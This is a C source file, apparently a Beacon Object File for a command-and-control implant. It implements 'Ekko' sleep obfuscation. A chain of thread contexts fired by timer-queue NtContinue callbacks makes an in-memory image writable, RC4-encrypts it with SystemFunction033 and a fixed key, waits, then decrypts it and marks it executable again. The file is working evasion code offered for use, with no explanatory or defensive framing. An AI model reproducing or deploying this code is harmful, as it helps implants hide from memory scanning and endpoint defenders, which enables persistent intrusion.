#include <windows.h>

WINUSERAPI int WINAPI USER32$MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

#ifdef WIN_X64

#define NT_SUCCESS(Status)      ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread()       ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess()      ((HANDLE)(LONG_PTR)-1)

typedef struct {
	DWORD   Length;
	DWORD   MaximumLength;
	PVOID   Buffer;
} USTRING;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect
);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateTimerQueue(VOID);

WINBASEAPI BOOL WINAPI KERNEL32$CreateTimerQueueTimer(
	PHANDLE phNewTimer,
	HANDLE TimerQueue,
	WAITORTIMERCALLBACK Callback,
	PVOID Parameter,
	DWORD DueTime,
	DWORD Period,
	ULONG Flags
);

WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(
	HANDLE hHandle,
	DWORD dwMilliseconds
);

WINBASEAPI BOOL WINAPI KERNEL32$SetEvent(
	HANDLE hEvent
);

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
);

WINBASEAPI VOID WINAPI NTDLL$RtlCaptureContext(
	PCONTEXT ContextRecord
);

WINBASEAPI NTSTATUS WINAPI NTDLL$NtContinue(
	PCONTEXT ContextRecord,
	BOOLEAN TestAlert
);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	BOOL bManualReset,
	BOOL bInitialState,
	LPCWSTR lpName
);

/**
 * Copy relevant CONTEXT registers from src to dst
 */
void CopyContextRegisters(CONTEXT *dst, CONTEXT *src) {
	dst->ContextFlags = src->ContextFlags;
	dst->Rax = src->Rax;
	dst->Rcx = src->Rcx;
	dst->Rdx = src->Rdx;
	dst->Rbx = src->Rbx;
	dst->Rsp = src->Rsp;
	dst->Rbp = src->Rbp;
	dst->Rsi = src->Rsi;
	dst->Rdi = src->Rdi;
	dst->R8  = src->R8;
	dst->R9  = src->R9;
	dst->R10 = src->R10;
	dst->R11 = src->R11;
	dst->R12 = src->R12;
	dst->R13 = src->R13;
	dst->R14 = src->R14;
	dst->R15 = src->R15;
	dst->Rip = src->Rip;
}

void EkkoObfuscation(char * start_addr, int size, int sleep_time) {
    CONTEXT CtxThread = { 0 };
	CtxThread.ContextFlags = CONTEXT_ALL;  /** REQUIRED for RtlCaptureContext */
    
	CONTEXT *RopProtRW = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopMemEnc = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopDelay  = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopMemDec = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopProtRX = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopSetEvt = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	
	HANDLE  hTimerQueue = NULL;
	HANDLE  hNewTimer = NULL;
	HANDLE  hEvent = NULL;
	PVOID   ImageBase = NULL;
	DWORD   ImageSize = 0;
	DWORD   OldProtect = 0;
	DWORD   SleepTime = 0;

    PVOID   NtContinue = NTDLL$NtContinue;

	CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
    USTRING Key         = { 0 };
    USTRING Img         = { 0 };

	hTimerQueue = KERNEL32$CreateTimerQueue();
	hEvent      = KERNEL32$CreateEventW( 0, 0, 0, 0 );

    ImageBase = start_addr;
    ImageSize = (DWORD)size;
	SleepTime = (DWORD)sleep_time;

	// Setup encryption key and image data structures
	Key.Length = 16;
	Key.MaximumLength = 16;
	Key.Buffer = KeyBuf;
	
	Img.Length = ImageSize;
	Img.MaximumLength = ImageSize;
	Img.Buffer = ImageBase;

	if (KERNEL32$CreateTimerQueueTimer(
		&hNewTimer,
		hTimerQueue,
		(WAITORTIMERCALLBACK)NTDLL$RtlCaptureContext,
		&CtxThread,
		0,
		0,
		WT_EXECUTEINTIMERTHREAD
	)){

		KERNEL32$WaitForSingleObject( hEvent, 0x32 );  /** 50 ms timeout for RtlCaptureContext */
		
		/** Validate CtxThread was captured */
		if (CtxThread.Rip == 0) {
			return;
		}

		CopyContextRegisters( RopProtRW, &CtxThread );
        CopyContextRegisters( RopMemEnc, &CtxThread );
        CopyContextRegisters( RopDelay,  &CtxThread );
        CopyContextRegisters( RopMemDec, &CtxThread );
        CopyContextRegisters( RopProtRX, &CtxThread );
        CopyContextRegisters( RopSetEvt, &CtxThread );

		// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW->Rsp  -= 8;
        RopProtRW->Rip   = (DWORD64)KERNEL32$VirtualProtect;
        RopProtRW->Rcx   = (DWORD64)ImageBase;
        RopProtRW->Rdx   = (DWORD64)ImageSize;
        RopProtRW->R8    = (DWORD64)PAGE_READWRITE;
        RopProtRW->R9    = (DWORD64)&OldProtect;

        // SystemFunction033( &Img, &Key ); - RC4 Encrypt
        RopMemEnc->Rsp  -= 8;
        RopMemEnc->Rip   = (DWORD64)GetProcAddress(LoadLibraryA("cryptsp.dll"), "SystemFunction033");
        RopMemEnc->Rcx   = (DWORD64)&Img;
        RopMemEnc->Rdx   = (DWORD64)&Key;

        // WaitForSingleObject( NtCurrentProcess(), SleepTime );
        RopDelay->Rsp   -= 8;
        RopDelay->Rip    = (DWORD64)KERNEL32$WaitForSingleObject;
        RopDelay->Rcx    = (DWORD64)NtCurrentProcess();
        RopDelay->Rdx    = (DWORD64)SleepTime;

        // SystemFunction033( &Img, &Key ); - RC4 Decrypt
        RopMemDec->Rsp  -= 8;
        RopMemDec->Rip   = (DWORD64)GetProcAddress(LoadLibraryA("cryptsp.dll"), "SystemFunction033");
        RopMemDec->Rcx   = (DWORD64)&Img;
        RopMemDec->Rdx   = (DWORD64)&Key;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX->Rsp  -= 8;
        RopProtRX->Rip   = (DWORD64)KERNEL32$VirtualProtect;
        RopProtRX->Rcx   = (DWORD64)ImageBase;
        RopProtRX->Rdx   = (DWORD64)ImageSize;
        RopProtRX->R8    = (DWORD64)PAGE_EXECUTE_READWRITE;
        RopProtRX->R9    = (DWORD64)&OldProtect;

        // SetEvent( hEvent );
        RopSetEvt->Rsp  -= 8;
        RopSetEvt->Rip   = (DWORD64)KERNEL32$SetEvent;
        RopSetEvt->Rcx   = (DWORD64)hEvent;

        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        KERNEL32$CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        KERNEL32$WaitForSingleObject(hEvent, INFINITE);
    }
}

#elif defined(WIN_X86)
	WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

	void EkkoObfuscation(char * start_addr, int size, int time) {
		KERNEL32$Sleep(time);
	}
#endif

void go(char * start_addr, int size, int time) {
	EkkoObfuscation(start_addr, size, time);
}